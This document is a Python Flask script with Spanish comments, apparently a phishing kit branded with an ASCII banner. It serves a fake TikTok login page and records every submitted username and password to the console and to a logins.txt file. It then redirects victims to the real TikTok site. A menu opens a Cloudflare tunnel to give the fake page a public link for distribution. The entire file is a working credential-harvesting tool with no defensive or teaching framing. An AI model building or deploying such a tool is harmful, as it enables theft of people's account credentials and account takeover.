import os
import time
import re
import subprocess
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Guardar logs
def log_to_file(user, password):
    with open("logins.txt", "a", encoding="utf-8") as f:
        f.write(f"[LOGIN] Usuario: {user} | Contraseña: {password}\n")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        password = request.form.get('password')
        print(f"\n\033[92m[LOGIN] Usuario: {user} | Contraseña: {password}\033[0m\n")
        log_to_file(user, password)
        return redirect("https://tiktok.com")
    return render_template('index.html')

@app.route('/login_google')
def login_google():
    print("\033[93m[LOGIN] Inicio de sesión con Google\033[0m")
    log_to_file("Google", "OAuth")
    return redirect("https://tiktok.com")

@app.route('/login_facebook')
def login_facebook():
    print("\033[94m[LOGIN] Inicio de sesión con Facebook\033[0m")
    log_to_file("Facebook", "OAuth")
    return redirect("https://tiktok.com")

@app.route('/login_apple')
def login_apple():
    print("\033[90m[LOGIN] Inicio de sesión con Apple\033[0m")
    log_to_file("Apple", "OAuth")
    return redirect("https://tiktok.com")


def mostrar_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[91m")  # Rojo
    print(r""" 
 ██▓ ███▄    █  ▄▄▄       ▄████▄  ▄▄▄█████▓ ██▓ ██▒   █▓ ▒█████      ██▓███   ██░ ██  ██▓  ██████  ██░ ██ 
▓██▒ ██ ▀█   █ ▒████▄    ▒██▀ ▀█  ▓  ██▒ ▓▒▓██▒▓██░   █▒▒██▒  ██▒   ▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒
▒██▒▓██  ▀█ ██▒▒██  ▀█▄  ▒▓█    ▄ ▒ ▓██░ ▒░▒██▒ ▓██  █▒░▒██░  ██▒   ▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░
░██░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒░ ▓██▓ ░ ░██░  ▒██ █░░▒██   ██░   ▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ 
░██░▒██░   ▓██░ ▓█   ▓██▒▒ ▓███▀ ░  ▒██▒ ░ ░██░   ▒▀█░  ░ ████▓▒░   ▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓
░▓  ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ░▒ ▒  ░  ▒ ░░   ░▓     ░ ▐░  ░ ▒░▒░▒░    ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
 ▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░  ░  ▒       ░     ▒ ░   ░ ░░    ░ ▒ ▒░    ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
 ▒ ░   ░   ░ ░   ░   ▒   ░          ░       ▒ ░     ░░  ░ ░ ░ ▒     ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░
 ░           ░       ░  ░░ ░                ░        ░      ░ ░               ░  ░  ░ ░        ░   ░  ░  ░
                         ░                          ░                                                     
    """)
    print("github.com/x4tt     tiktok.com/lil.x4t\n")
    print("╔══════════════════════════════════════╗")
    print("║             Menú Principal           ║")
    print("╠══════════════════════════════════════╣")
    print("║ [01] Iniciar TikTok Login            ║")
    print("╚══════════════════════════════════════╝")
    print("\033[0m")

    opcion = input("➤ Selecciona una opción: ")

    if opcion == "1" or opcion == "01":
        print("\n[✔] Iniciando servidor Flask y túnel Cloudflare...\n")

        # Inicia Cloudflare y captura salida
        proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )

        # Esperamos encontrar el enlace
        while True:
            line = proc.stdout.readline()
            if line == '':
                break
            if "trycloudflare.com" in line:
                match = re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
                if match:
                    url = match.group(0)
                    print(f"\n\033[92m[✔] Tu enlace público: {url}\033[0m\n")
                    break

        # Ejecuta Flask
        app.run(host="0.0.0.0", port=5000)

    else:
        print("\n[✖] Opción inválida.")
        time.sleep(2)
        mostrar_menu()


if __name__ == '__main__':
    mostrar_menu()
